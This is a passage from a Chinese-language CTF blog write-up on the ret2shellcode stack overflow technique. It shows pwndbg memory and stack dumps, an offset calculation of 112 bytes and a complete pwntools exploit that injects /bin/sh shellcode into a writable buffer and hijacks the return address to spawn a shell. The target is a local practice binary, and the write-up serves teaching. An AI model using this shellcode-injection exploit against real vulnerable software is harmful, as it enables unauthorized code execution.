+</span></span><span class="line"><span class="cl"><span class="mh">0xf7fc6000</span> <span class="mh">0xf7fc7000</span> <span class="n">r</span><span class="o">--</span><span class="n">p</span>     <span class="mi">1000</span> <span class="mi">0</span>      <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">i386</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">ld</span><span class="o">-</span><span class="n">linux</span><span class="p">.</span><span class="n">so</span><span class="mf">.2</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0xf7fc7000</span> <span class="mh">0xf7fec000</span> <span class="n">r</span><span class="o">-</span><span class="n">xp</span>    <span class="mi">25000</span> <span class="mi">1000</span>   <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">i386</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">ld</span><span class="o">-</span><span class="n">linux</span><span class="p">.</span><span class="n">so</span><span class="mf">.2</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0xf7fec000</span> <span class="mh">0xf7ffb000</span> <span class="n">r</span><span class="o">--</span><span class="n">p</span>     <span class="n">f000</span> <span class="mi">26000</span>  <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">i386</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">ld</span><span class="o">-</span><span class="n">linux</span><span class="p">.</span><span class="n">so</span><span class="mf">.2</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0xf7ffb000</span> <span class="mh">0xf7ffd000</span> <span class="n">r</span><span class="o">--</span><span class="n">p</span>     <span class="mi">2000</span> <span class="mi">34000</span>  <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">i386</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">ld</span><span class="o">-</span><span class="n">linux</span><span class="p">.</span><span class="n">so</span><span class="mf">.2</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0xf7ffd000</span> <span class="mh">0xf7ffe000</span> <span class="n">rw</span><span class="o">-</span><span class="n">p</span>     <span class="mi">1000</span> <span class="mi">36000</span>  <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">i386</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">ld</span><span class="o">-</span><span class="n">linux</span><span class="p">.</span><span class="n">so</span><span class="mf">.2</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0xfffdd000</span> <span class="mh">0xffffe000</span> <span class="n">rwxp</span>    <span class="mi">21000</span> <span class="mi">0</span>      <span class="p">[</span><span class="n">stack</span><span class="p">]</span>
+</span></span></code></pre></div><p>查了一下才知道在较新版本的Linux Kernel（v5.10）下.bss段默认没有执行权限，换用kernel版本相对较旧（v5.4）的Ubuntu 20.04就没问题了</p>
+<p>OK现在程序的结构就比较清晰了，既然没有后台，那么我们就自己将shellcode写入可执行段里不就好了</p>
+<p>那就最后动态调试一下开计算偏移量</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">stack</span> <span class="mi">36</span>
+</span></span><span class="line"><span class="cl"><span class="mo">00</span><span class="o">:</span><span class="mo">0000</span><span class="err">│</span> <span class="n">esp</span> <span class="mh">0xffffcddc</span> <span class="err">—▸</span> <span class="mh">0x80485c0</span> <span class="p">(</span><span class="n">main</span><span class="o">+</span><span class="mi">147</span><span class="p">)</span> <span class="err">◂—</span> <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl"><span class="mo">01</span><span class="o">:</span><span class="mo">0004</span><span class="err">│</span>     <span class="mh">0xffffcde0</span> <span class="err">—▸</span> <span class="mh">0x8048680</span> <span class="err">◂—</span> <span class="n">bound</span>  <span class="n">edi</span><span class="p">,</span> <span class="n">qword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">ecx</span> <span class="o">+</span> <span class="mh">0x65</span><span class="p">]</span> <span class="cm">/* &#39;bye bye ~&#39; */</span>
+</span></span><span class="line"><span class="cl"><span class="mo">02</span><span class="o">:</span><span class="mo">000</span><span class="mi">8</span><span class="err">│</span>     <span class="mh">0xffffcde4</span> <span class="err">—▸</span> <span class="mh">0xffffcdfc</span> <span class="err">◂—</span> <span class="err">&#39;</span><span class="n">AAAAA</span><span class="err">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="mo">03</span><span class="o">:</span><span class="mo">000</span><span class="n">c</span><span class="err">│</span>     <span class="mh">0xffffcde8</span> <span class="err">◂—</span> <span class="mh">0x64</span> <span class="cm">/* &#39;d&#39; */</span>
+</span></span><span class="line"><span class="cl"><span class="mo">04</span><span class="o">:</span><span class="mo">0010</span><span class="err">│</span>     <span class="mh">0xffffcdec</span> <span class="err">◂—</span> <span class="mh">0x0</span>
+</span></span><span class="line"><span class="cl"><span class="mo">05</span><span class="o">:</span><span class="mo">0014</span><span class="err">│</span>     <span class="mh">0xffffcdf0</span> <span class="err">—▸</span> <span class="mh">0xf7fc4540</span> <span class="p">(</span><span class="n">__kernel_vsyscall</span><span class="p">)</span> <span class="err">◂—</span> <span class="n">push</span>   <span class="n">ecx</span>
+</span></span><span class="line"><span class="cl"><span class="mo">06</span><span class="o">:</span><span class="mo">001</span><span class="mi">8</span><span class="err">│</span>     <span class="mh">0xffffcdf4</span> <span class="err">◂—</span> <span class="mh">0xffffffff</span>
+</span></span><span class="line"><span class="cl"><span class="mo">07</span><span class="o">:</span><span class="mo">001</span><span class="n">c</span><span class="err">│</span>     <span class="mh">0xffffcdf8</span> <span class="err">—▸</span> <span class="mh">0x8048034</span> <span class="err">◂—</span> <span class="n">push</span>   <span class="n">es</span>
+</span></span><span class="line"><span class="cl"><span class="mi">08</span><span class="o">:</span><span class="mo">0020</span><span class="err">│</span>     <span class="mh">0xffffcdfc</span> <span class="err">◂—</span> <span class="err">&#39;</span><span class="n">AAAAA</span><span class="err">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="mi">09</span><span class="o">:</span><span class="mo">0024</span><span class="err">│</span>     <span class="mh">0xffffce00</span> <span class="err">—▸</span> <span class="mh">0xf7ff0041</span> <span class="err">◂—</span> <span class="err">&#39;</span><span class="n">invalid</span> <span class="n">format</span> <span class="n">in</span> <span class="n">exception</span> <span class="n">string</span><span class="err">\</span><span class="n">n</span><span class="err">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="mi">0</span><span class="nl">a</span><span class="p">:</span><span class="mo">002</span><span class="mi">8</span><span class="err">│</span>     <span class="mh">0xffffce04</span> <span class="err">◂—</span> <span class="mh">0x20</span> <span class="cm">/* &#39; &#39; */</span>
+</span></span><span class="line"><span class="cl"><span class="mi">0</span><span class="nl">b</span><span class="p">:</span><span class="mo">002</span><span class="n">c</span><span class="err">│</span>     <span class="mh">0xffffce08</span> <span class="err">◂—</span> <span class="mh">0x0</span>
+</span></span><span class="line"><span class="cl"><span class="mi">0</span><span class="nl">c</span><span class="p">:</span><span class="mo">0030</span><span class="err">│</span>     <span class="mh">0xffffce0c</span> <span class="err">—▸</span> <span class="mh">0xffffcf8c</span> <span class="err">◂—</span> <span class="mh">0x20</span> <span class="cm">/* &#39; &#39; */</span>
+</span></span><span class="line"><span class="cl"><span class="mi">0</span><span class="nl">d</span><span class="p">:</span><span class="mo">0034</span><span class="err">│</span>     <span class="mh">0xffffce10</span> <span class="err">◂—</span> <span class="mh">0x0</span>
+</span></span><span class="line"><span class="cl"><span class="p">...</span> <span class="err">↓</span>        <span class="mi">2</span> <span class="n">skipped</span>
+</span></span><span class="line"><span class="cl"><span class="mi">10</span><span class="o">:</span><span class="mo">0040</span><span class="err">│</span>     <span class="mh">0xffffce1c</span> <span class="err">◂—</span> <span class="mi">9</span> <span class="cm">/* &#39;\t&#39; */</span>
+</span></span><span class="line"><span class="cl"><span class="mi">11</span><span class="o">:</span><span class="mo">0044</span><span class="err">│</span>     <span class="mh">0xffffce20</span> <span class="err">—▸</span> <span class="mh">0xf7fc4540</span> <span class="p">(</span><span class="n">__kernel_vsyscall</span><span class="p">)</span> <span class="err">◂—</span> <span class="n">push</span>   <span class="n">ecx</span>
+</span></span><span class="line"><span class="cl"><span class="mi">12</span><span class="o">:</span><span class="mo">004</span><span class="mi">8</span><span class="err">│</span>     <span class="mh">0xffffce24</span> <span class="err">◂—</span> <span class="mh">0x0</span>
+</span></span><span class="line"><span class="cl"><span class="mi">13</span><span class="o">:</span><span class="mo">004</span><span class="n">c</span><span class="err">│</span>     <span class="mh">0xffffce28</span> <span class="err">—▸</span> <span class="mh">0xf7d964be</span> <span class="err">◂—</span> <span class="err">&#39;</span><span class="n">_dl_audit_preinit</span><span class="err">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="mi">14</span><span class="o">:</span><span class="mo">0050</span><span class="err">│</span>     <span class="mh">0xffffce2c</span> <span class="err">—▸</span> <span class="mh">0xf7fa8054</span> <span class="p">(</span><span class="n">_dl_audit_preinit</span><span class="err">@</span><span class="n">got</span><span class="p">.</span><span class="n">plt</span><span class="p">)</span> <span class="err">—▸</span> <span class="mh">0xf7fddda0</span> <span class="p">(</span><span class="n">_dl_audit_preinit</span><span class="p">)</span> <span class="err">◂—</span> <span class="n">endbr32</span>
+</span></span><span class="line"><span class="cl"><span class="mi">15</span><span class="o">:</span><span class="mo">0054</span><span class="err">│</span>     <span class="mh">0xffffce30</span> <span class="err">—▸</span> <span class="mh">0xf7fbe4a0</span> <span class="err">—▸</span> <span class="mh">0xf7d7e000</span> <span class="err">◂—</span> <span class="mh">0x464c457f</span>
+</span></span><span class="line"><span class="cl"><span class="mi">16</span><span class="o">:</span><span class="mo">005</span><span class="mi">8</span><span class="err">│</span>     <span class="mh">0xffffce34</span> <span class="err">—▸</span> <span class="mh">0xf7fd6f80</span> <span class="p">(</span><span class="n">_dl_fixup</span><span class="o">+</span><span class="mi">240</span><span class="p">)</span> <span class="err">◂—</span> <span class="n">mov</span>    <span class="n">edi</span><span class="p">,</span> <span class="n">eax</span>
+</span></span><span class="line"><span class="cl"><span class="mi">17</span><span class="o">:</span><span class="mo">005</span><span class="n">c</span><span class="err">│</span>     <span class="mh">0xffffce38</span> <span class="err">—▸</span> <span class="mh">0xf7d964be</span> <span class="err">◂—</span> <span class="err">&#39;</span><span class="n">_dl_audit_preinit</span><span class="err">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="mi">18</span><span class="o">:</span><span class="mo">0060</span><span class="err">│</span>     <span class="mh">0xffffce3c</span> <span class="err">—▸</span> <span class="mh">0xf7fbe4a0</span> <span class="err">—▸</span> <span class="mh">0xf7d7e000</span> <span class="err">◂—</span> <span class="mh">0x464c457f</span>
+</span></span><span class="line"><span class="cl"><span class="mi">19</span><span class="o">:</span><span class="mo">0064</span><span class="err">│</span>     <span class="mh">0xffffce40</span> <span class="err">—▸</span> <span class="mh">0xffffce80</span> <span class="err">—▸</span> <span class="mh">0xf7fa8000</span> <span class="p">(</span><span class="n">_GLOBAL_OFFSET_TABLE_</span><span class="p">)</span> <span class="err">◂—</span> <span class="mh">0x229dac</span>
+</span></span><span class="line"><span class="cl"><span class="mi">1</span><span class="nl">a</span><span class="p">:</span><span class="mo">006</span><span class="mi">8</span><span class="err">│</span>     <span class="mh">0xffffce44</span> <span class="err">—▸</span> <span class="mh">0xf7fbe66c</span> <span class="err">—▸</span> <span class="mh">0xf7ffdba0</span> <span class="err">—▸</span> <span class="mh">0xf7fbe780</span> <span class="err">—▸</span> <span class="mh">0xf7ffda40</span> <span class="err">◂—</span> <span class="p">...</span>
+</span></span><span class="line"><span class="cl"><span class="mi">1</span><span class="nl">b</span><span class="p">:</span><span class="mo">006</span><span class="n">c</span><span class="err">│</span>     <span class="mh">0xffffce48</span> <span class="err">—▸</span> <span class="mh">0xf7fbeb00</span> <span class="err">—▸</span> <span class="mh">0xf7d98cc6</span> <span class="err">◂—</span> <span class="err">&#39;</span><span class="n">GLIBC_PRIVATE</span><span class="err">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="mi">1</span><span class="nl">c</span><span class="p">:</span><span class="mo">0070</span><span class="err">│</span>     <span class="mh">0xffffce4c</span> <span class="err">◂—</span> <span class="mh">0x1</span>
+</span></span><span class="line"><span class="cl"><span class="mi">1</span><span class="nl">d</span><span class="p">:</span><span class="mo">0074</span><span class="err">│</span>     <span class="mh">0xffffce50</span> <span class="err">◂—</span> <span class="mh">0x1</span>
+</span></span><span class="line"><span class="cl"><span class="mi">1</span><span class="nl">e</span><span class="p">:</span><span class="mo">007</span><span class="mi">8</span><span class="err">│</span>     <span class="mh">0xffffce54</span> <span class="err">◂—</span> <span class="mh">0x0</span>
+</span></span><span class="line"><span class="cl"><span class="mf">1f</span><span class="o">:</span><span class="mo">007</span><span class="n">c</span><span class="err">│</span>     <span class="mh">0xffffce58</span> <span class="err">—▸</span> <span class="mh">0xf7fa8000</span> <span class="p">(</span><span class="n">_GLOBAL_OFFSET_TABLE_</span><span class="p">)</span> <span class="err">◂—</span> <span class="mh">0x229dac</span>
+</span></span><span class="line"><span class="cl"><span class="mi">20</span><span class="o">:</span><span class="mo">00</span><span class="mi">80</span><span class="err">│</span>     <span class="mh">0xffffce5c</span> <span class="err">—▸</span> <span class="mh">0xf7e9eecb</span> <span class="p">(</span><span class="n">__init_misc</span><span class="o">+</span><span class="mi">43</span><span class="p">)</span> <span class="err">◂—</span> <span class="n">add</span>    <span class="n">esp</span><span class="p">,</span> <span class="mh">0x10</span>
+</span></span><span class="line"><span class="cl"><span class="mi">21</span><span class="o">:</span><span class="mo">00</span><span class="mi">84</span><span class="err">│</span>     <span class="mh">0xffffce60</span> <span class="err">—▸</span> <span class="mh">0xffffd050</span> <span class="err">◂—</span> <span class="err">&#39;</span><span class="o">/</span><span class="n">mnt</span><span class="o">/</span><span class="n">c</span><span class="o">/</span><span class="n">Users</span><span class="o">/</span><span class="n">asuka</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">CTF</span><span class="o">/</span><span class="n">wiki</span><span class="o">/</span><span class="n">pwn</span><span class="o">/</span><span class="n">ret2shellcode</span><span class="o">/</span><span class="n">ret2shellcode</span><span class="err">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="mi">22</span><span class="o">:</span><span class="mo">00</span><span class="mi">88</span><span class="err">│</span>     <span class="mh">0xffffce64</span> <span class="err">◂—</span> <span class="mh">0x70</span> <span class="cm">/* &#39;p&#39; */</span>
+</span></span><span class="line"><span class="cl"><span class="mi">23</span><span class="o">:</span><span class="mo">00</span><span class="mi">8</span><span class="n">c</span><span class="err">│</span> <span class="n">ebp</span> <span class="mh">0xffffce68</span> <span class="err">—▸</span> <span class="mh">0xf7ffd020</span> <span class="p">(</span><span class="n">_rtld_global</span><span class="p">)</span> <span class="err">—▸</span> <span class="mh">0xf7ffda40</span> <span class="err">◂—</span> <span class="mh">0x0</span>
+</span></span></code></pre></div><p>写入的内容距离栈底<code>ebp</code>的长度为0xffffce68-0xffffcdfc=0x6C=108，再加上4位的<code>ebp</code>地址就是112，万事俱备</p>
+<h3 id="exp">EXP</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./ret2shellcode&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">buf2</span> <span class="o">=</span> <span class="mh">0x0804A080</span>
+</span></span><span class="line"><span class="cl"><span class="n">shell</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">sh</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">shell</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">112</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">buf2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></div><p>其中<code>asm(shellcraft.sh())</code>是生成一个32位的shell（如果想生成64位的可以<code>asm(shellcraft.amd64.sh())</code>）</p>
+<p>这样就可以顺利拿下shell了</p>
+<h2 id="参考">参考</h2>
+<ul>
+<li>
+<p><a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#_3"><em>CTFwiki</em></a></p>
+</li>
+<li>
+<p>CSDN</p>
+<ul>
+<li><em><a href="https://blog.csdn.net/z671514087/article/details/124506218">第二次简单的栈溢出</a></em></li>
+<li><em><a href="https://blog.csdn.net/qq_45691294/article/details/111387593">ret2shellcode</a></em></li>
+</ul>
+</li>
+<li>
+<p>简书</p>
+<ul>
+<li><em><a href="https://www.jianshu.com/p/a04b050f5192">ret2shellcode</a></em></li>
+</ul>
+</li>
+<li>
+<p>BLOG</p>
+<ul>
+<li><em><a href="https://paper.seebug.org/1968/">二进制漏洞学习笔记 - PWN 篇</a></em></li>
+</ul>
+</li>
+</ul>
+
+            </div>
+        </article></main>
+</div>
+<footer class="footer">
+    <span class="footer_item"> </span>
+    &nbsp;
+
+    <div class="footer_social-icons">
+<a href="https://github.com/ASUKA39" target="_blank" rel="noopener noreferrer me"
+    title="Github">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
+    </path>
+</svg>
+</a>
+<a href="/index.xml" target="_blank" rel="noopener noreferrer me"
+    title="Rss">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path d="M4 11a9 9 0 0 1 9 9" />
+    <path d="M4 4a16 16 0 0 1 16 16" />
+    <circle cx="5" cy="19" r="1" />
+</svg>
+</a>
+</div>
+    <small class="footer_copyright">
+        © 2024 a39.
+        Powered by <a href="https://github.com/hugo-sid/hugo-blog-awesome" target="_blank" rel="noopener">Hugo blog awesome</a>.
+    </small>
+</footer><a href="#" title="Go to top" id="totop">
+    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
+    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
+</svg>
+
+</a>
+
+
+    
+
+
+
+
+    
+    
+        
+    
+
+    
+    
+        
+    
+
+
+
+    
+    <script src="https://asuka39.github.io/js/main.min.35f435a5d8eac613c52daa28d8af544a4512337d3e95236e4a4978417b8dcb2f.js" integrity="sha256-NfQ1pdjqxhPFLaoo2K9USkUSM30&#43;lSNuSkl4QXuNyy8="></script>
+
+    
+
+</body>
+</html>
